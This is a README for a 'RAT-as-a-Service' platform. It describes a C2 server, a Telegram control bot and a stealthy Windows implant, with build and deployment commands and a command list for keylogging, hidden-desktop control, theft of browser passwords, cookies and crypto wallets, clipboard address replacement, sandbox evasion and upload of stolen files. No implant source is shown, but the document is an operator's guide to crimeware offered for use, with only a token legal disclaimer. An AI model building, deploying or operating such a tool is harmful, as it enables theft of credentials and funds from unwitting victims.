# RAT-as-a-Service Platform

A comprehensive Remote Access Toolkit (RAT) platform with advanced credential theft and hot wallet detection capabilities.

## Features

### Core Components
- **C2 Server**: Command and control relay hub
- **Telegram Bot**: Interactive control interface  
- **RAT Agent**: Windows implant with stealth capabilities

### Capabilities
- **System Control**: Shell commands, screenshots, keylogging
- **HVNC**: Hidden desktop sessions with remote control
- **Credential Theft**: Browser passwords, cookies, autofill data
- **Document Scanning**: Extract sensitive data from files
- **Hot Wallet Theft**: Detect and steal cryptocurrency wallet files
- **Clipboard Manipulation**: Monitor and replace crypto addresses

### Supported Hot Wallets
- Exodus, Atomic Wallet, Electrum
- Bitcoin Core, Litecoin Core, Dogecoin Core
- Monero GUI, Ethereum Wallet, MyEtherWallet
- Jaxx Liberty, Coinomi, Trust Wallet
- Phantom, Solflare, Guarda
- And more...

## Architecture

```
Telegram Bot <-> C2 Server <-> RAT Agents
     ^              ^              ^
  Commands      Task Queue    Target Systems
```

## Setup

### Prerequisites
- Go 1.24+
- Windows target systems
- Telegram Bot Token
- VPS for C2 server

### Build Instructions

1. **Configure settings** in `config/config.go`:
   - Update C2_BASE_URL with your server IP
   - Set Telegram bot token

2. **Build C2 Server**:
   ```bash
   cd c2-server
   go build -o c2-server server.go
   ```

3. **Build Telegram Bot**:
   ```bash
   cd telegram-bot
   go build -o telegram-bot bot.go
   ```

4. **Build Agent**:
   ```bash
   cd agent
   go build -ldflags "-s -w -H windowsgui" -o agent.exe agent.go
   ```

### Deployment

1. **Deploy C2 Server**:
   ```bash
   ./c2-server
   ```

2. **Start Telegram Bot**:
   ```bash
   ./telegram-bot <BOT_TOKEN>
   ```

3. **Deploy Agent** on target systems

## Usage

### Telegram Commands

#### Agent Management
- `/agents` - List all connected agents
- `/select <agent_id>` - Select agent for operations
- `/info` - Show selected agent details

#### System Operations
- `/shell <command>` - Execute shell command
- `/screenshot` - Take screenshot
- `/keylog <seconds>` - Start keylogger
- `/terminate` - Terminate agent

#### Credential Theft
- `/stealpasswords` - Extract browser passwords
- `/stealcookies` - Extract browser cookies
- `/stealautofill` - Extract autofill data
- `/stealdocs` - Scan documents for passwords
- `/stealall` - Comprehensive credential theft

#### Hot Wallet Theft
- `/stealwallets` - Detect and steal hot wallet files

#### HVNC (Hidden Desktop)
- `/hvncstart` - Start hidden desktop session
- `/hvncstop` - Stop hidden desktop session
- `/hvncscreen` - Screenshot from hidden desktop
- `/hvncmouse <x> <y> <action>` - Send mouse event
- `/hvnckbd <action> <key/text>` - Send keyboard event

#### Clipboard Manipulation
- `/clipmonitor <seconds>` - Monitor clipboard changes
- `/clipread` - Read current clipboard content
- `/clipwrite <text>` - Write text to clipboard
- `/clipreplace` - Replace crypto addresses

## Security Features

### Anti-Analysis
- Debugger detection
- Sandbox evasion
- Timing checks
- System metrics validation

### Stealth
- Process hiding
- Network encryption
- Jittered beacons
- Error handling

## File Transfer

Large files (hot wallets, credentials) are automatically uploaded to Pixeldrain for efficient transfer and download.

## Configuration

Edit `config/config.go` to customize:
- Server endpoints
- Beacon intervals
- Crypto addresses for replacement
- File paths and patterns

## Legal Notice

This software is for educational and authorized testing purposes only. Users are responsible for compliance with applicable laws and regulations. 